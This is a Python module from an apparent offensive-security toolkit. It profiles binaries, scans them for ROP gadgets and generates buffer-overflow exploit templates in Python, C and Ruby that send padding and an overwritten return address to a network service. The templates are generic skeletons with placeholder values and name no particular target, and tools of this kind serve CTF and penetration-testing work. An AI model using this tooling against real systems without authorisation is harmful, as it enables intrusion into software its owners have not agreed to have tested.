from __future__ import annotations

import json
import re
import struct
import subprocess
import tempfile
from pathlib import Path

from fsociety.core.base import tool
from fsociety.core.logger import Log
from fsociety.core.utils import load_lines

GADGET_DB = {
    "x64": {
        "pop rdi ; ret":   b"\x5f\xc3",
        "pop rsi ; ret":   b"\x5e\xc3",
        "pop rdx ; ret":   b"\x5a\xc3",
        "pop rax ; ret":   b"\x58\xc3",
        "pop rsp ; ret":   b"\x5c\xc3",
        "syscall ; ret":   b"\x0f\x05\xc3",
        "leave ; ret":     b"\xc9\xc3",
        "xor rax, rax ; ret": b"\x48\x31\xc0\xc3",
        "jmp rsp":         b"\xff\xe4",
        "ret":             b"\xc3",
    },
    "x86": {
        "pop eax ; ret":   b"\x58\xc3",
        "pop ebx ; ret":   b"\x5b\xc3",
        "pop ecx ; ret":   b"\x59\xc3",
        "pop edx ; ret":   b"\x5a\xc3",
        "int 0x80 ; ret":  b"\xcd\x80\xc3",
        "jmp esp":         b"\xff\xe4",
        "leave ; ret":     b"\xc9\xc3",
        "ret":             b"\xc3",
    },
}

@tool("sploix", "Exploit toolkit: binary profile, gadget scan, template builder", category="exploit")
class Sploix:
    @staticmethod
    def build_parser(p):
        sub = p.add_subparsers(dest="cmd", required=True)

        prof = sub.add_parser("profile", help="profile an ELF/PE binary")
        prof.add_argument("binary")
        prof.add_argument("-o", "--out")

        gadgets = sub.add_parser("gadgets", help="scan for common ROP gadgets")
        gadgets.add_argument("binary")
        gadgets.add_argument("--arch", default="auto", choices=["auto", "x64", "x86"])
        gadgets.add_argument("--max", type=int, default=30)
        gadgets.add_argument("-o", "--out")

        template = sub.add_parser("template", help="emit a working exploit skeleton")
        template.add_argument("--lang", default="python",
                              choices=["python", "c", "ruby"])
        template.add_argument("--host", default="127.0.0.1")
        template.add_argument("--port", type=int, default=1337)
        template.add_argument("--offset", type=int, default=64)
        template.add_argument("--ret", help="return address (hex)")
        template.add_argument("-o", "--out")

        pack = sub.add_parser("pack", help="pack hex bytes as little-endian address")
        pack.add_argument("value", help="hex like 0xdeadbeef")

    @staticmethod
    def _elf_info(path: str):
        with open(path, "rb") as fh:
            head = fh.read(20)
        if len(head) < 20:
            return {"error": "file too small"}
        info = {"path": path, "size": Path(path).stat().st_size}
        if head[:4] == b"\x7fELF":
            info["format"] = "elf"
            info["arch"] = {0x03: "x86", 0x3e: "x64", 0x28: "arm", 0xb7: "aarch64"}.get(head[18], hex(head[18]))
            info["bits"] = "64" if head[4] == 2 else "32"
            info["endian"] = "little" if head[5] == 1 else "big"
            info["type"] = {1: "rel", 2: "exec", 3: "dyn", 4: "core"}.get(struct.unpack("<H", head[16:18])[0], "?")
        elif head[:2] == b"MZ":
            info["format"] = "pe"
            info["arch"] = "pe"
        else:
            info["format"] = "unknown"
        return info

    @staticmethod
    def _checksec(path: str):
        if not Path("/usr/bin/checksec").exists() and not Path("/usr/local/bin/checksec").exists():
            return {"error": "checksec not installed"}
        try:
            out = subprocess.run(["checksec", "--file=" + path, "--output=json"],
                                 capture_output=True, text=True, timeout=15)
            if out.returncode == 0 and out.stdout.strip().startswith("{"):
                return json.loads(out.stdout)
            out = subprocess.run(["checksec", "--file=" + path],
                                 capture_output=True, text=True, timeout=15)
            return {"raw": out.stdout.strip().splitlines()}
        except (subprocess.SubprocessError, OSError) as exc:
            return {"error": str(exc)}

    @staticmethod
    def _scan_gadgets(path: str, arch: str, max_hits: int):
        data = Path(path).read_bytes()
        if arch == "auto":
            arch = "x64" if b"\x00\x00\x00\x00\x00\x00" not in data[:20] else "x86"
        patterns = GADGET_DB.get(arch, {})
        hits = []
        for name, needle in patterns.items():
            start = 0
            found = 0
            while found < max_hits:
                idx = data.find(needle, start)
                if idx < 0:
                    break
                hits.append({"gadget": name, "offset": idx, "arch": arch})
                start = idx + 1
                found += 1
        return hits

    @staticmethod
    def _template(lang: str, host: str, port: int, offset: int, ret: str | None) -> str:
        ret_addr = ret or "0x4141414141414141"
        if lang == "python":
            return f'''#!/usr/bin/env python3
# sploix template — python
import socket, struct, sys

HOST = "{host}"
PORT = {port}
OFFSET = {offset}
RET = {ret_addr}
BAD = {{0x00, 0x0a, 0x0d}}

def p64(n):
    return struct.pack("<Q", n)

def build():
    pad = b"A" * OFFSET
    return pad + p64(RET)

def main():
    payload = build()
    for b in payload:
        if b in BAD:
            print(f"bad byte {{b:#x}} at offset", flush=True)
    sock = socket.create_connection((HOST, PORT), timeout=5)
    sock.sendall(payload)
    try:
        while True:
            data = sock.recv(4096)
            if not data:
                break
            sys.stdout.buffer.write(data)
    except KeyboardInterrupt:
        pass
    sock.close()

if __name__ == "__main__":
    main()
'''
        if lang == "c":
            return f'''/* sploix template — c */
#include <arpa/inet.h>
#include <stdint.h>
#include <stdio.h>
#include <string.h>
#include <sys/socket.h>
#include <unistd.h>

#define OFFSET {offset}
#define RET_ADDR {ret_addr}ULL

int main(void) {{
    int s = socket(AF_INET, SOCK_STREAM, 0);
    struct sockaddr_in a = {{0}};
    a.sin_family = AF_INET;
    a.sin_port = htons({port});
    inet_pton(AF_INET, "{host}", &a.sin_addr);
    if (connect(s, (struct sockaddr*)&a, sizeof(a)) < 0) {{ perror("connect"); return 1; }}
    unsigned char buf[OFFSET + 8];
    memset(buf, 'A', OFFSET);
    uint64_t ret = RET_ADDR;
    memcpy(buf + OFFSET, &ret, 8);
    write(s, buf, sizeof(buf));
    close(s);
    return 0;
}}
'''
        return f'''# sploix template — ruby
require "socket"

HOST = "{host}"
PORT = {port}
OFFSET = {offset}
RET = {ret_addr}

def p64(n)
  [n].pack("Q<")
end

def build
  "A" * OFFSET + p64(RET)
end

sock = TCPSocket.new(HOST, PORT)
sock.write(build)
sock.close
puts "sent"
'''

    @staticmethod
    def run(args, log: Log) -> int:
        if args.cmd == "profile":
            info = Sploix._elf_info(args.binary)
            info["sec"] = Sploix._checksec(args.binary)
            if args.out:
                Path(args.out).write_text(json.dumps(info, indent=2))
            print(json.dumps(info, indent=2))
            return 0

        if args.cmd == "gadgets":
            hits = Sploix._scan_gadgets(args.binary, args.arch, args.max)
            if args.out:
                Path(args.out).write_text(json.dumps(hits, indent=2))
            for h in hits:
                print(f"{h['offset']:#010x}  {h['gadget']}")
            log.ok(f"{len(hits)} gadget(s)")
            return 0

        if args.cmd == "template":
            code = Sploix._template(args.lang, args.host, args.port, args.offset, args.ret)
            if args.out:
                Path(args.out).write_text(code)
                log.ok(f"template -> {args.out}")
            else:
                print(code)
            return 0

        if args.cmd == "pack":
            try:
                value = int(args.value, 16)
            except ValueError:
                log.err("invalid hex value")
                return 2
            print(struct.pack("<Q", value).hex())
            return 0
        return 2
